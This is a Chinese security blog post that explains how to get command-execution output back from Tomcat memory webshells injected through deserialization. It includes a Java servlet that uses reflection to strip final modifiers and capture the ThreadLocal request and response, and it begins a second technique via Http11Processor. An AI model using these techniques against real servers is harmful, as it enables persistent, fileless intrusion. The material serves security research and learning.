<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Tomcat型内存马回显以及反序列化写入 | stoocea's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
  font-family: Bender;
  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
  font-family: BenderLight;
  src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
  font-family: 'JetBrains Mono';
  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
 --dark-background: url('/img/pc-bg.jpg');
 --light-background: url('/img/bk.jpg');
 --theme-encrypt-confirm: 'confirm'
}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
window.mermaid = mermaid;
code.paintMermaid();
</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Tomcat型内存马回显以及反序列化写入</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-07-28T13:50:51.000Z" id="date"> 2024-07-28</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-08-09T10:22:44.951Z" id="updated"> 2024-08-09</time></div></span></div></div><hr><div id="post-content"><h1 id="背景引入"><a href="#背景引入" class="headerlink" title="背景引入"></a>背景引入</h1><p>多适用于对方机器不出网，无法弹 shell 的情况，用来获取命令执行的结果。如果是能够解析 JSP 的中间件就很好利用，落地一个 JSP 进行一个 Request 和 Response 的获取就好，但是如果像是 Spring 种，考虑反序列化或者其他能够达到代码执行的情况，注入内存马，并且获得回显就需要另辟蹊径。</p>
<p>总的思路还是获取到当前处理请求服务线程下的 Rquest 和 Response</p>
<h1 id="ThreadLocal-Response-回显"><a href="#ThreadLocal-Response-回显" class="headerlink" title="ThreadLocal Response 回显"></a>ThreadLocal Response 回显</h1><h2 id="0x01-ThreadLocal-认识"><a href="#0x01-ThreadLocal-认识" class="headerlink" title="0x01 ThreadLocal 认识"></a>0x01 ThreadLocal 认识</h2><p>首先介绍一下 ThreadLocal<br>在 java 中有一个问题被经常提起：线程安全的问题。这里所说的安全不是代码执行或者数据泄露那种安全，它是影响整个业务处理结果，以及处理效率的一个问题，属于开发的范畴。web 服务就是一个特别显著的例子，当我们服务器接收大量的请求时，后台的某一个关键变量，比如某一商品的货存量，有 n 个客户同时请求它的购买，并且每个客户购买的数量都不同。并且此后同时支付的现金，此时 n 个线程开始同时进行，货物数量的值是共享。<br>此时会因为没有线程隔离以及线程保护，导致每个客户都购买了相同数量的货物，并不是自己想要的货物。<br>如何解决这个问题呢？<br>ThreadLocal 就是用来解决这个问题的，它的作用就是在多线程请求的情况下，维护好每一个单一线程的变量，避免因多线程操作而导致共享数据不一致的情况。<br>具体的代码示例就不写了，理解就行</p>
<h2 id="0x02-思路分析及具体代码执行内容"><a href="#0x02-思路分析及具体代码执行内容" class="headerlink" title="0x02 思路分析及具体代码执行内容"></a>0x02 思路分析及具体代码执行内容</h2><p>回到 ThreadLocal 获取当前进程下的 request 和 repsonse 的内容：<br>思路来自 Kingkk 师傅，不论是在 Springboot 还是 javaweb 等项目中，filter servlet listener 始终是一种设计思想，他们都是会存在的，并且 ApplicationFilterChain 这一路的责任链机制依然存在。我们观察到在他的属性值变量中存在两种变量<code>lastServicedRequest</code>以及<code>lastServicedResponse</code>，并且他们的类型都是 ThreadLocal 类型<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721649278337-7a366631-8290-44b2-ab31-f439dc1809a3.png#averageHue=%2327292b&clientId=u8e48b11c-4381-4&from=paste&height=365&id=u9499e276&originHeight=684&originWidth=1616&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=387813&status=done&style=none&taskId=ub767ade7-9a23-4e3e-a1f4-a3430918257&title=&width=861.8666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721649278337-7a366631-8290-44b2-ab31-f439dc1809a3.png#averageHue=%2327292b&clientId=u8e48b11c-4381-4&from=paste&height=365&id=u9499e276&originHeight=684&originWidth=1616&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=387813&status=done&style=none&taskId=ub767ade7-9a23-4e3e-a1f4-a3430918257&title=&width=861.8666666666667" referrerpolicy="no-referrer" alt="image.png"><br>在 ApplicationFilterChain 初始化的情况下它们并不会有所赋值，但是我们跟进其中责任链实现逻辑中 internalDofilter 的部分，当我们从filterCofigs 中读取完所有的 filterConfig 配置，并且走完它们的所有逻辑之后，也就是 <code>if(pos &lt; n)</code>不会满足判断条件，来到之后的 Trycatch 块中<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721649506501-2dc8b278-39f3-4cf6-885b-c97fbdbb91ab.png#averageHue=%2328292c&clientId=u8e48b11c-4381-4&from=paste&height=212&id=u2386ca76&originHeight=398&originWidth=1285&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=208957&status=done&style=none&taskId=u36ee1a1d-7f6f-4e93-b82f-39922f4df07&title=&width=685.3333333333334'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721649506501-2dc8b278-39f3-4cf6-885b-c97fbdbb91ab.png#averageHue=%2328292c&clientId=u8e48b11c-4381-4&from=paste&height=212&id=u2386ca76&originHeight=398&originWidth=1285&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=208957&status=done&style=none&taskId=u36ee1a1d-7f6f-4e93-b82f-39922f4df07&title=&width=685.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>他首先就是<code>if (ApplicationDispatcher.WRAP_SAME_OBJECT)</code>判断，然后开始对 <code>lastServicedRequest</code>以及<code>lastServicedResponse</code>都进行一段赋值操作，这里所赋的值，就是我们想要获取到的 response 以及 request<br>这里两段判断条件都是一样的，也就是<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>必须不为空<br>所以我们可以总结出利用思路：</p>
<ol>
<li>反射修改 <code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>为 ture</li>
<li>然而上条逻辑的执行依赖于当前线程，也就是说此时能够代码执行到这里的时候，责任链机制已经过了一遍，我们此时还是没有进入后续的 set 逻辑，只能再访问一遍，再走一遍责任链机制才可以。所以后续的逻辑还应该加上：<code>lastServicedRequest</code>和<code>lastServicedResponse</code>都初始化并且为 null  （相当于把 ApplicationFilterChain 的 static 代码块走了一遍）</li>
<li><code>lastServicedRequest</code>和<code>lastServicedResponse</code>,以及 <code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>变量都是final 修饰，也就是不可修改的定值，这对于我们反序列化打入内存马非常不利，所以我们还需要通过反射修改其 final 属性</li>
</ol>
<p>上述利用存在两个个利用条件：<br>一是 JDK 在 17 版本之后不能够通过反射去修改 final 属性值。也就是在 Springboot3 或者 Spring6 这种内置要求 JDK17 版本之后的服务都不能通过这种方式打入内存马<br>二是 tomcat10.1.x 之后的版本（也就是 Springboot3 要求的版本），判断条件也发生了变化<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721659944545-86b4497a-7d8a-47cc-bad9-cf449a293087.png#averageHue=%2328292c&clientId=u0d811a8b-7968-4&from=paste&height=195&id=u44e9ac6e&originHeight=292&originWidth=1165&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=132920&status=done&style=none&taskId=uca3dd554-2e3f-47f1-bcd6-f56792cec2a&title=&width=776.6666666666666'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721659944545-86b4497a-7d8a-47cc-bad9-cf449a293087.png#averageHue=%2328292c&clientId=u0d811a8b-7968-4&from=paste&height=195&id=u44e9ac6e&originHeight=292&originWidth=1165&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=132920&status=done&style=none&taskId=uca3dd554-2e3f-47f1-bcd6-f56792cec2a&title=&width=776.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>所以利用场景限制于 Tomcat&lt;10 ，JDK&lt;17 的情况，具体一点就是 Springboot2，spring5，以及版本符合条件的 javaweb 环境等（高版本有高版本的方法，之后再写）<br>接下来开始具体的代码构造，考虑之后的结合反序列化打入内存马</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.stoocea.example.Servlets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.swing.plaf.synth.SynthRadioButtonMenuItemUI;</span><br><span class="line"><span class="keyword">import</span> java.io.FileDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/evil&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil_Servlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//反射获取WRAP_SOME_OBJECT_FIELD lastServicedRequest lastServicedResponse</span></span><br><span class="line">            Field WRAP_SOME_OBJECT_FIELD=Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            Field lastServicedRequestfield=ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            Field lastServicedResponsefield=ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line">            WRAP_SOME_OBJECT_FIELD.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequestfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponsefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//使用modifiersField修改属性值的final修饰</span></span><br><span class="line">            <span class="comment">//每一个Field都会存在一个变量 modifiers用来描述修饰词，所以这里我们获取到的是Field的modifiers 它本质上是一个int类型的值</span></span><br><span class="line">            java.lang.reflect.Field  modifiersfield= Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiersfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//修改WRAP_SOME_OBJECT_FIELD以及requst和response的modifiers，值的话由于要得到16进制位数，并且清除final属性，本质上就是将他修改为0x0000即可，这里getModifiers()的结果为0x0010 Modifier.FINAL的结果也是0x0010，所以两者&amp;~运算得到0x0000</span></span><br><span class="line">            modifiersfield.setInt(WRAP_SOME_OBJECT_FIELD,WRAP_SOME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersfield.setInt(lastServicedRequestfield,lastServicedRequestfield.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">            modifiersfield.setInt(lastServicedResponsefield,lastServicedResponsefield.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果是第一次访问，WRAP_SOME_OBJECT_FIELD肯定是没有值的，所以我们赋值上true 并且同时给lastServicedRequest和lastServicedResponse都初始化</span></span><br><span class="line">            <span class="keyword">if</span>(!WRAP_SOME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>))&#123;</span><br><span class="line">                WRAP_SOME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">                lastServicedResponsefield.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;ServletResponse&gt;());</span><br><span class="line">                lastServicedRequestfield.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;ServletRequest&gt;());</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;<span class="comment">//第二次访问开始正式获取当前线程下的Req和Resp</span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; threadLocalReq= (ThreadLocal&lt;ServletRequest&gt;)lastServicedRequestfield.get(<span class="literal">null</span>);</span><br><span class="line">                ThreadLocal&lt;ServletResponse&gt; threadLocalResp=(ThreadLocal&lt;ServletResponse&gt;) lastServicedResponsefield.get(<span class="literal">null</span>);</span><br><span class="line">                <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> threadLocalReq.get();</span><br><span class="line">                <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> threadLocalResp.get();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                System.out.println(req);</span><br><span class="line">                System.out.println(servletRequest);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后我们两次访问 evil 路由，在第二次调试进入逻辑：<br>req 是 doGet 方法的参数里面的 req，也就是我们当前进程下的 Request。然后我们自己获取到的 servletRequest 获取到之后是相同的<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721720955376-d8e97866-a48f-4875-837f-bc956bacbe80.png#averageHue=%232d343e&clientId=u92403063-f90b-4&from=paste&height=223&id=u32624ba5&originHeight=418&originWidth=2109&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=380677&status=done&style=none&taskId=u4419f081-8ab3-4ae8-97ea-c674d86b31e&title=&width=1124.8'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721720955376-d8e97866-a48f-4875-837f-bc956bacbe80.png#averageHue=%232d343e&clientId=u92403063-f90b-4&from=paste&height=223&id=u32624ba5&originHeight=418&originWidth=2109&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=380677&status=done&style=none&taskId=u4419f081-8ab3-4ae8-97ea-c674d86b31e&title=&width=1124.8" referrerpolicy="no-referrer" alt="image.png"></p>
<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>整体的思路是建立在无文件，反序列化打入内存马的基础上进行的，所以还需要考虑反序列化本身的条件。这里提一嘴 Shiro 的问题，我之前复习分析 Filter 型内存马的时候，无意中由于自己打入了 shiro 的依赖，导致 filter 链的流程和常规的 tomcat 构建流程不太一样，那个时候我还提了一嘴调用栈：<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721722546234-5a6e9d8d-e744-4a94-9702-16236fa2a6bf.png#averageHue=%234d574f&clientId=ucc1d67d4-8ed4-4&from=paste&height=570&id=u9dc0e2d2&originHeight=1068&originWidth=1117&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=867229&status=done&style=none&taskId=u3a8a457a-b6dd-4554-851c-ada5c1d5b06&title=&width=595.7333333333333'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721722546234-5a6e9d8d-e744-4a94-9702-16236fa2a6bf.png#averageHue=%234d574f&clientId=ucc1d67d4-8ed4-4&from=paste&height=570&id=u9dc0e2d2&originHeight=1068&originWidth=1117&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=867229&status=done&style=none&taskId=u3a8a457a-b6dd-4554-851c-ada5c1d5b06&title=&width=595.7333333333333" referrerpolicy="no-referrer" alt="image.png"><br>shiro 本质就是一层 filter，所以它是在 <code>if (pos &lt; n)</code>中执行完自己的逻辑了，后面的 lastServiceRequest.set(request)就执行不到了，所以我们就获取不到当前线程的 request 和 reponse<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721722936249-e8b64bc2-d8bc-4407-9577-cc60e9542766.png#averageHue=%2327282b&clientId=ucc1d67d4-8ed4-4&from=paste&height=221&id=u641e961e&originHeight=415&originWidth=1413&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=235276&status=done&style=none&taskId=ud4e33b74-af60-436f-852f-299201b6772&title=&width=753.6'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721722936249-e8b64bc2-d8bc-4407-9577-cc60e9542766.png#averageHue=%2327282b&clientId=ucc1d67d4-8ed4-4&from=paste&height=221&id=u641e961e&originHeight=415&originWidth=1413&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=235276&status=done&style=none&taskId=ud4e33b74-af60-436f-852f-299201b6772&title=&width=753.6" referrerpolicy="no-referrer" alt="image.png"><br>当然有时候也不一定要局限于打 shiro 的反序列化，只要你的反序列化逻辑在责任链机制走完之后，都能够利用。<br>但是这里留了一个伏笔，我们必须访问两次指定路由才能够真正获取到 ServletRequest，那么在反序列化的时候该如何实现呢？这里其实可以延伸出无文件落地内存马的一个总的思想，我们后面总结再谈。</p>
<h1 id="全局存储-Response"><a href="#全局存储-Response" class="headerlink" title="全局存储 Response"></a>全局存储 Response</h1><h2 id="0x01-初步思路建立"><a href="#0x01-初步思路建立" class="headerlink" title="0x01 初步思路建立"></a>0x01 初步思路建立</h2><p>想要一个能够适应大多数情况的 response 和 request 获取思路。我们从一次处理 servlet 容器处理 web 请求的调用栈入手，肯定有一个地方是最开始处理 request 和 repsonse，并且将他们当作参数传入的下一调用栈的地方。<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721735348820-e762962e-b7b8-4e48-a129-f3c504713291.png#averageHue=%2348534b&clientId=u8ca2416b-d1af-4&from=paste&height=463&id=ufe4e3a2b&originHeight=868&originWidth=1024&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=468821&status=done&style=none&taskId=u7cb3adef-2fa4-48c7-a4fc-3832039f3db&title=&width=546.1333333333333'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721735348820-e762962e-b7b8-4e48-a129-f3c504713291.png#averageHue=%2348534b&clientId=u8ca2416b-d1af-4&from=paste&height=463&id=ufe4e3a2b&originHeight=868&originWidth=1024&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=468821&status=done&style=none&taskId=u7cb3adef-2fa4-48c7-a4fc-3832039f3db&title=&width=546.1333333333333" referrerpolicy="no-referrer" alt="image.png"><br>调用栈最开始的一次出现传递 request 和 response 的地方的是在 Http11Processor 的 service 方法中。虽然配图只给了这么一段，但实际上面大部分的逻辑都是直接处理 Request 和 Response ，一直到这里传递给下一条调用栈。其实这个时候就可以入手去寻找 request 和 response 了<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721731132036-f505bfe4-8255-4c47-b944-a332e89a13b2.png#averageHue=%23282b2f&clientId=ucc1d67d4-8ed4-4&from=paste&height=284&id=ua032f85e&originHeight=532&originWidth=1198&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=265024&status=done&style=none&taskId=uf3d57a26-0304-4193-a8f1-a02d995b9af&title=&width=638.9333333333333'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721731132036-f505bfe4-8255-4c47-b944-a332e89a13b2.png#averageHue=%23282b2f&clientId=ucc1d67d4-8ed4-4&from=paste&height=284&id=ua032f85e&originHeight=532&originWidth=1198&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=265024&status=done&style=none&taskId=uf3d57a26-0304-4193-a8f1-a02d995b9af&title=&width=638.9333333333333" referrerpolicy="no-referrer" alt="image.png"><br><code>request</code> 和<code> response</code> 参数来自它的父类传参–<code>AbstractProcessor</code>，既然是他的父类传递的值，那么父类<code>AbstractProcessor</code>肯定被调用了。但是我们在调用栈中并没有找到<code>AbstractProcessor</code>的具体调用，观察上一级调用栈，是 AbstractProcessorLight，他其实是AbstractProcessor和Http11Processor 共同父类，只不过 Http11Processor 是继承自AbstractProcessor 才继承于 AbstractProcessorLight<br>关键是获取 AbstractProcessor，但是由于前面其实没有直接对于AbstractProcessor 的引用，这里我们获取到 Http11Processor 是一样的效果，也能获取到Request 和 Response<br>那么如何获取到 Http11Processor 呢？这里我们可以在任意 servlet 或者 controller 处打个断点（两者处的调用栈大差不差）然后观察一下（看上面的调用栈就行）在<code>AbstractProcessorLight</code>调用到 Http11<br>Processor 之前，由<code>ConnectionHandler</code>调用 process 方法中有如下逻辑：<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721749659786-73d4ca42-b921-4367-a6cf-cb249e502afd.png#averageHue=%23282c32&clientId=u9d1c3e82-4b69-4&from=paste&height=436&id=u9228976d&originHeight=719&originWidth=1664&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=364174&status=done&style=none&taskId=u5b424719-6a80-49fa-b0f6-7b99fe2fdc8&title=&width=1008.4847901959974'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721749659786-73d4ca42-b921-4367-a6cf-cb249e502afd.png#averageHue=%23282c32&clientId=u9d1c3e82-4b69-4&from=paste&height=436&id=u9228976d&originHeight=719&originWidth=1664&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=364174&status=done&style=none&taskId=u5b424719-6a80-49fa-b0f6-7b99fe2fdc8&title=&width=1008.4847901959974" referrerpolicy="no-referrer" alt="image.png"><br>两次判断 processor 是否为空，第一次是在判断之后执行的逻辑是判断我们否加载过 processor，如果有就直接给他加载出来不用后续的加载了。第二次判断是如果我们本次请求中没有加载过 processor 就从 AbstractProtocol 中调用<code>createProcessor()</code>方法来创建 Http11Processor<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721783821563-9e55380e-1899-4d44-a5b3-b247f2bbb1f1.png#averageHue=%232d2f33&clientId=u02afbd6d-c9af-4&from=paste&height=238&id=u5ac820d0&originHeight=446&originWidth=1276&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=242613&status=done&style=none&taskId=uf15295a0-6b1f-463d-ae69-1c22c5b7e3b&title=&width=680.5333333333333'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721783821563-9e55380e-1899-4d44-a5b3-b247f2bbb1f1.png#averageHue=%232d2f33&clientId=u02afbd6d-c9af-4&from=paste&height=238&id=u5ac820d0&originHeight=446&originWidth=1276&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=242613&status=done&style=none&taskId=uf15295a0-6b1f-463d-ae69-1c22c5b7e3b&title=&width=680.5333333333333" referrerpolicy="no-referrer" alt="image.png"><br>这里知道 Http11Processor 创建的过程还不够，我们还无法通过自己的代码执行去获取到 Http11Processor，只能再往下看<br>然后调用 register 方法，主要是从中获取一些请求信息（包括我们的 request），并封装存储起来<br class='item-img' data-src='https://cdn.nlark.com/yuque/0/2024/png/36078896/1721784132967-a92666c6-8310-48b4-9be0-abc31d004f80.png#averageHue=%2328292d&clientId=u02afbd6d-c9af-4&from=paste&height=418&id=ue37bcc51&originHeight=783&originWidth=1568&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=408234&status=done&style=none&taskId=u3fbf7d2d-d3e5-458a-b10a-689edba7a68&title=&width=836.2666666666667'><img src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1721784132967-a92666c6-8310-48b4-9be0-abc31d004f80.png#averageHue=%2328292d&clientId=u02afbd6d-c9af-4&from=paste&height=418&id=ue37bcc51&originHeight=783&originWidth=1568&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=408234&status=done&style=none&taskId=u3fbf7d2d-d3e5-458a-b10a-689edba7a68&title=&width=836.2666666666667" referrerpolicy="no-referrer" alt="image.png"><br>大致逻辑分为两个部分：</p>
<ul>
<li>获取 Processor 中封装的 request 信息，存储为 RequestInfo</li>
<li>然后将当此的 RequestInfo set 进 global 属性，这里的 global 属性实际上就是 RequestGroupInfo，用来存储这些获取到的RequestInfo</li>
</ul>
